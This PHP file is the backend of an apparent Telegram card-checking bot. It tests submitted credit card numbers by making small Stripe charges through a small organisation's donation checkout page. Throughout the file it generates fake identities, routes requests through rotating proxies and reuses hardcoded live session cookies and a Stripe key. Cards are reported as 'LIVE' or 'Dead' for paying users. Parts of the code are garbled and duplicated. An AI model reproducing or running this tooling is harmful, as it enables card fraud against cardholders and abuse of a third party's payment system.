<?php
//=========RANK DETERMINE=========//
$currentDate = date('Y-m-d');
    $rank = "FREE";
    $expiryDate = "0";

    $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
    $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
    $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

    if(in_array($userId, $owners)) {
        $rank = "OWNER";
       $expiryDate = "UNTIL DEAD"; 
    } else { 
        foreach ($paidUsers as $index => $line) {
            list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
            if ($userIdFromFile == $userId) {
                if ($userExpiryDate < $currentDate) {
                    unset($paidUsers[$index]); //
                    file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                    $freeUsers[] = $userId; // add to free users list
                    file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                } else    $currentDate = date('Y-m-d');
    $rank = "FREE";
    $expiryDate = "0";

    $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
    $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
    $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

    if(in_array($userId, $owners)) {
        $rank = "OWNER";
       $expiryDate = "UNTIL DEAD"; 
    } else {
        foreach ($paidUsers as $index => $line) {
            list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
            if ($userIdFromFile == $userId) {
                if ($userExpiryDate < $currentDate) {
                    unset($paidUsers[$index]); 
                    file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                    $freeUsers[] = $userId; 
                    file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                } else {
                    $rank = "PAID";
                    $expiryDate = $userExpiryDate;
                }
            }
        }
    } {
                    $rank = "PAID";
                    $expiryDate = $userExpiryDate;
                }
            }
        }
    }
//=======RANK DETERMINE END=========//
$update = json_decode(file_get_contents("php://input"), TRUE);
$text = $update["message"]["text"];
//========WHO CAN CHECK FUNC========//

//=====WHO CAN CHECK FUNC END======//
if (preg_match('/^(\/chk|\.chk|!chk)/', $text)) {
    $userid = $update['message']['from']['id'];

    if (!checkAccess($userid)) {
        $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b> @$username You're not Premium user❌</b>", $message_id);
      exit();
    }
$start_time = microtime(true);

  $chatId = $update["message"]["chat"]["id"];
    $message_id = $update["message"]["message_id"];
    $keyboard = "";

//=======WHO CAN CHECK END========//

//====ANTISPAM AND WRONG FORMAT====//
    if (strlen($message) <= 4) {
            sendMessage($chatId, '<b>• Wrong Format! ⚠️</b>%0A• 𝘚𝘦𝘯𝘥 <code>/chk cc|mm|yy|cvv</code>%0A• 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 <code>Stripe Charge 1 USD</code>', $message_id);
            exit();
  }
$r = "0";
 
$r = rand(0, 100);
//==ANTISPAM AND WRONG FORMAT END==//


//=======checker part start========//
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}


$lista = substr($message, 5);
$separa = explode("|", $lista);
$cc = isset($separa[0]) ? substr($separa[0], 0, 16) : ''; // Get only first 16 digits
$mes = isset($separa[1]) ? $separa[1] : '';
$ano = isset($separa[2]) ? $separa[2] : '';
$cvv = isset($separa[3]) ? $separa[3] : '';


$last4 = substr($cc, -4);


$sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b>

[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ ■□□□□ 20%🔵
[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ★  2001 Insufficient Funds?
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 @$username/<code>[$rank]</code>

━━━━━━━━━━━━━━━━━━</b>");

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//================[Functions and Variables]================//
#------[Email Generator]------#



function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@gmail.com';
}
$email = emailGenerate();
#------[Username Generator]------#
function usernameGen($length = 13)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$un = usernameGen();
#------[Password Generator]------#
function passwordGen($length = 15)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$pass = passwordGen();

#------[CC Type Randomizer]------#

 $cardNames = array(
    "3" => "American Express",
    "4" => "Visa",
    "5" => "MasterCard",
    "6" => "Discover"
 );
 $card_type = $cardNames[substr($cc, 0, 1)];




sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>

[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ ■■□□□ 40%🔵
[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ★ 696969: Duplicate card exists?
━━━━━━━━━
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 @$username/<code>[$rank]</code>

━━━━━━━━━━━━━━━━━</b>
━━━━━━━━━━━━━━━━━━</b>");

  //==================[Randomizing Details]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$postcode = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$num = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

//==============[Randomizing Details-END]======================//
sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>

[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ ■■■□□ 60%🔵
[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ★ 2044: Declined - Call Issuer?
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 @$username/<code>[$rank]</code>

━━━━━━━━━━━━━━━━━━</b>");


  //==================[BIN LOOK-UP]======================//

  $bin = substr($lista, 0,6);
  $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$bin.'');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = strtoupper(GetStr($fim, '"name":"', '"'));
$brand = strtoupper(GetStr($fim, '"brand":"', '"'));
$country = strtoupper(GetStr($fim, '"country":{"name":"', '"'));
$scheme = strtoupper(GetStr($fim, '"scheme":"', '"'));
$emoji = GetStr($fim, '"emoji":"', '"');
$type =strtoupper(GetStr($fim, '"type":"', '"'));
   //IF BIN ARE NOT AVAILABLE ----//
    if (empty($scheme)) {
        $scheme = "N/A";
    }
    if (empty($type)) {
        $type = "N/A";
    }
    if (empty($brand)) {
        $brand = "N/A";
    }
    if (empty($bank)) {
        $bank = "N/A/N/A";
    }
    if (empty($name)) {
        $name = "N/A";
    }
    if (empty($emoji)) {
        $emoji = "N/A";
    }
    if (empty($currency)) {
        $currency = "N/A";
    }


//==================[BIN LOOK-UP-END]======================//



sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>

[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ ■■■■□ 80%🔵
[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ★ cvv: Gateway Rejected: cvv?
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 @$username/<code>[$rank]</code>

━━━━━━━━━━━━━━━━━━</b>");
//=======================[5 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: api.stripe.com';
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: en-US,en;q=0.5';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Path: /v1/payment_methods';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'Referer: https://js.stripe.com/';
$headers[] = 'sec-ch-ua: "Chromium";v="118", "Brave";v="118", "Not=A?Brand";v="99"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][line1]=4821+Ridge+Top+Cir&billing_details[address][line2]=&billing_details[address][city]=Anchorage&billing_details[address][state]=AK&billing_details[address][postal_code]=99508&billing_details[address][country]=US&billing_details[name]=Min+Thant&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=50c29e79-70fb-4db0-806e-601807510536383382&sid=7f037b8b-f7d4-4dbe-8e7a-7c940bf17590aca2af&pasted_fields=number&payment_user_agent=stripe.js%2F3e325ca450%3B+stripe-js-v3%2F3e325ca450%3B+split-card-element&referrer=https%3A%2F%2Ffriendsoflakeclaremont.org&time_on_page=57419&key=pk_live_qVbUTbBD3NFaB0QThLooisJK00we1Bhu4o');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
$brandi = trim(strip_tags(getStr($result1,'"brand": "','"')));

curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

//==================req 1 end===============//
//==================req 2===============//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://friendsoflakeclaremont.org/?page_id=4562&level=1');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_POST, 1);
$headers = array(
  'authority: friendsoflakeclaremont.org',
  'method: POST',
  'path: /?page_id=4562&level=1',
  'scheme: https',
  'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
  'accept-language: en-US,en;q=0.5',
  'content-type: application/x-www-form-urlencoded',
  'cookie: pmpro_visit=1; PHPSESSID=a9ff1fdf021e1418517e0ab1bba02a56; __stripe_mid=50c29e79-70fb-4db0-806e-601807510536383382; __stripe_sid=7f037b8b-f7d4-4dbe-8e7a-7c940bf17590aca2af; wordpress_logged_in_ed491f5bdb1beac3480bec0690cd8f88=bullet3%7C1699018091%7CwnNvTmOCOI2Ebou1zDmKw14GNcALBGc9RCtA2SWxEvL%7C7ad883e90f12dbb2987899118f93911cd5869e2f3c9c9bf0e674c4c23a0e7fdd; wfwaf-authcookie-24ac4681fd54ee5515bf6721694a0af3=45125%7Csubscriber%7Cread%7Cf2fedea412c5ae9a227f53d6a973a047136805e95e06714f29555ddd0263c3dc',
  'origin: https://friendsoflakeclaremont.org',
  'referer: https://friendsoflakeclaremont.org/?page_id=4562&level=1',
  'sec-fetch-dest: document',
  'sec-fetch-mode: navigate',
  'sec-fetch-site: same-origin',
  'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
     );


curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'level=1&checkjavascript=1&bfirstname='.$firstname.'&blastname='.$lastname.'&baddress1=4821+Ridge+Top+Cir&baddress2=&bcity=Anchorage&bstate=AK&bzipcode=99508&bcountry=US&bphone=%28831%29+756-8311&bemail='.$email.'&bconfirmemail=Daemon99%40gmail.com&CardType='.$brandi.'&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX'.$last4.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');


curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

$result2 = curl_exec($ch);
$msg = trim(strip_tags(getStr($result2,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));

//==================req 2 end===============//



sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>

[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ ■■■■■ 99%🔵
[↯] 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 ★ cvv: Gateway Rejected: cvv?
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 @$username/<code>[$rank]</code>
</b>
━━━━━━━━━━━━━━━━━━</b>", $message_id);
$end_time = microtime(true);
$time = number_format($end_time - $start_time, 2);

  //======checker part end=========//


if (
    strpos($result2, 'Thank you for your membership.') !== false ||
    strpos($result2, "Membership Confirmation") !== false ||
    strpos($result2, 'Your card zip code is incorrect.') !== false ||
    strpos($result2, "Thank You For Donation.") !== false ||
    strpos($result2, "incorrect_zip") !== false ||
    strpos($result2, "Success ") !== false ||
    strpos($result2, '"type":"one-time"') !== false ||
    strpos($result2, "/donations/thank_you?donation_number=") !== false
) {
  $resp = "<b>
𝙎𝙏𝙍𝙄𝙋𝙀 𝘾𝙃𝘼𝙍𝙂𝙀 1$
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ CHANGE 🟢
[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code> Thanks for your donation </code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 <code>$bank</code>
[↯] 𝗕𝗮𝗻𝗸 <code>$brand</code>
[↯] 𝗧𝗬𝗣𝗘 <code>$type</code>
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 <code>$name $emoji</code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗣𝗥𝗢𝗫𝗬 <code>$r.XXX.XXX.XX Live ✅</code>
[↯] 𝗧𝗜𝗠𝗘 <code>$time seconds</code> 
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 @$username <code>[$rank]</code>


</b>";
sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}


elseif (
    strpos($result2, 'Error updating default payment method.Your card does not support this type of purchase.') !== false ||
    strpos($result2, "Your card does not support this type of purchase.") !== false ||
    strpos($result2, 'transaction_not_allowed') !== false ||
    strpos($result2, "insufficient_funds") !== false ||
    strpos($result2, "incorrect_zip") !== false ||
    strpos($result2, "Your card has insufficient funds.") !== false ||
    strpos($result2, '"status":"success"') !== false ||
    strpos($result2, "stripe_3ds2_fingerprint") !== false
) {
$resp = "<b>
𝙎𝙏𝙍𝙄𝙋𝙀 𝘾𝙃𝘼𝙍𝙂𝙀 1$ ✅
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ LIVE 🟢
[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code>CCN CHANGE 2$ </code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 <code>$bank</code>
[↯] 𝗕𝗮𝗻𝗸 <code>$brand</code>
[↯] 𝗧𝗬𝗣𝗘 <code>$type</code>
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 <code>$name $emoji</code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗣𝗥𝗢𝗫𝗬 <code>$r.XXX.XXX.XX Live ✅</code>
[↯] 𝗧𝗜𝗠𝗘 <code>$time seconds</code> 
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 @$username <code>[$rank]</code>


</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}


elseif (
    strpos($result2, 'security code is incorrect.') !== false ||
    strpos($result2, 'security code is invalid.') !== false ||
    strpos($result2, "incorrect_cvc") !== false
) {
$resp = "<b>
𝙎𝙏𝙍𝙄𝙋𝙀 𝘾𝙃𝘼𝙍𝙂𝙀 1$ ✅
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ Live 🟢
[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code> CCN CHANGE 1$ ✅ </code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 <code>$bank</code>
[↯] 𝗕𝗮𝗻𝗸 <code>$brand</code>
[↯] 𝗧𝗬𝗣𝗘 <code>$type</code>
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 <code>$name $emoji</code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗣𝗥𝗢𝗫𝗬 <code>$r.XXX.XXX.XX Live ✅</code>
[↯] 𝗧𝗜𝗠𝗘 <code>$time seconds</code> 
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 @$username <code>[$rank]</code>


</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}


elseif(strpos($result2, "Error updating default payment method. Your card was declined.")) {
$resp = "<b>
𝙎𝙏𝙍𝙄𝙋𝙀 𝘾𝙃𝘼𝙍𝙂𝙀 1$ ❌
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ Dead 🔴
[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code>$msg </code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 <code>$bank</code>
[↯] 𝗕𝗮𝗻𝗸 <code>$brand</code>
[↯] 𝗧𝗬𝗣𝗘 <code>$type</code>
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 <code>$name $emoji</code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗣𝗥𝗢𝗫𝗬 <code>$r.XXX.XXX.XX Live ✅</code>
[↯] 𝗧𝗜𝗠𝗘 <code>$time seconds</code> 
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 @$username <code>[$rank]</code>


  </b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result2, "Unknown error generating account. Please contact us to set up your membership.")) {
$resp = "<b>
𝙎𝙏𝙍𝙄𝙋𝙀 𝘾𝙃𝘼𝙍𝙂𝙀 1$
━━━━━━━━━━━━━
[M] 𝗖𝗖 ★ <code>$lista</code>
[M] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ Dead 🔴
[M] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code>404 Error</code>
━━━━━━━━━━━━━━━━━━
[M] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 <code>$bank</code>
[M] 𝗕𝗮𝗻𝗸 <code>$brand</code>
[M] 𝗧𝗬𝗣𝗘 <code>$type</code>
[M] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 <code>$name $emoji</code>
━━━━━━━━━━━━━━━━━━
[M] 𝗣𝗥𝗢𝗫𝗬 <code>$r.XXX.XXX.XX Live ✅</code>
[M] 𝗧𝗜𝗠𝗘 <code>$time seconds</code> 
[M] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 @$username <code>[$rank]</code>


</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

else {
$resp = "<b>
𝙎𝙏𝙍𝙄𝙋𝙀 𝘾𝙃𝘼𝙍𝙂𝙀 1$ ❌
━━━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖 ★ <code>$lista</code>
[↯] 𝗦𝗧𝗔𝗧𝗨𝗦 ★ Dead 🔴
[↯] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ★ <code>$msg </code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼 <code>$bank</code>
[↯] 𝗕𝗮𝗻𝗸 <code>$brand</code>
[↯] 𝗧𝗬𝗣𝗘 <code>$type</code>
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 <code>$name $emoji</code>
━━━━━━━━━━━━━━━━━━
[↯] 𝗣𝗥𝗢𝗫𝗬 <code> $r.XXX.XXX.XX Live ✅</code>
[↯] 𝗧𝗜𝗠𝗘 <code>$time seconds</code> 
[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 @$username <code>[$rank]</code>


  </b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}
}